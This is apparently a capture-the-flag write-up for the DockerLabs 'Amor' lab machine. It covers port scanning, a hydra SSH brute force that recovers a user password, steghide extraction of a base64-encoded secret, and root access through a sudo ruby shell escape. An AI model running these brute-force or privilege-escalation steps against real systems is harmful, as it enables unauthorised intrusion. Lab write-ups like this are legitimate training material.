#Amor DockerLabs - 15/05/2024

#web - https://dockerlabs.es/#/

We performed an nmap scan:

```shell
└─$ nmap -sVC -p- -n --min-rate 5000 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-15 18:18 CEST
Nmap scan report for 172.17.0.2
Host is up (0.00010s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7e:72:b6:8b:5f:7c:23:64:dc:15:21:32:5f:ce:40:0a (ECDSA)
|_  256 05:8a:a7:27:0f:88:b9:70:84:ec:6d:33:dc:ce:09:6f (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: SecurSEC S.L
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.27 seconds
```

We find a port 80 which we access:

![Captura de pantalla 2024-05-15 185252](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/79eda3a9-5edc-4533-8754-6f427123fdd9)

We did a directory scan with gobuster but found nothing:

```shell
└─$ gobuster dir -u "http://172.17.0.2/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt       
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/server-status        (Status: 403) [Size: 275]
Progress: 661680 / 661683 (100.00%)
===============================================================
Finished
===============================================================
```

We also look at what the website has and see reports where we found a very interesting one:

![Captura de pantalla 2024-05-15 185307](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/2fcf8350-3dcf-4c12-9d5e-532b10445255)


We see a user ‘juan’ fired so we forget about him and another one called ‘carlota’.
We proceed to do a brute force attack with hydra:

```shell
└─$ hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2/
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-15 18:49:43
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: carlota   password: babygirl
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-15 18:49:47
```

It finds the password so let's try to log in with your username:

```shell
└─$ ssh carlota@172.17.0.2                                                
carlota@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.6.9-amd64 x86_64)
```

I tried to do a ‘sudo -l’ and a ‘find / -perm -4000 -user root 2>/dev/null’ but there is nothing exploitable.
Searching through the directories we found:

```shell
carlota@602e73150064:~/Desktop/fotos/vacaciones$
```

Where there is a ‘.jpg’ file and we download it to our local machine.

```shell
└─$ scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Desktop/Machines/Amor/
```

We use steghide to find the hidden information in the file in case we find something:

```shell
└─$ steghide extract -sf imagen.jpg
Enter passphrase: 
the file "secret.txt" does already exist. overwrite ? (y/n) y
wrote extracted data to "secret.txt".

```

```shell
└─$ cat secret.txt
ZXNsYWNhc2FkZXBpbnlwb24
```

We found something so we are going to decrypt it:

```shell
└─$ echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 --decode
eslacasadepinypon
```

Thinking that it could be that I thought it was a password but I could not find another user, I tried with the user ‘root’ but nothing I got again to the ssh server to browse the directories and we found a new user:

![Captura de pantalla 2024-05-15 185222](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/e3dcba9f-9a7d-435f-9259-6c033cda849b)

Entramos con el usuario "oscar" y su contraseña:

```shell
└─$ ssh oscar@172.17.0.2  
oscar@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.6.9-amd64 x86_64)
```

We see that we can log in and now we try to escalate privileges with this user to see if we can with this one:

```shell
$ sudo -l
Matching Defaults entries for oscar on 602e73150064:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User oscar may run the following commands on 602e73150064:
    (ALL) NOPASSWD: /usr/bin/ruby
```

We see that we can escalate privileges, we go to ‘https://gtfobins.github.io/gtfobins/env/’.
Search for ruby and paste the sudo command in the terminal:

```shell
$ sudo ruby -e 'exec "/bin/sh"'
```

```shell
# whoami
root
```
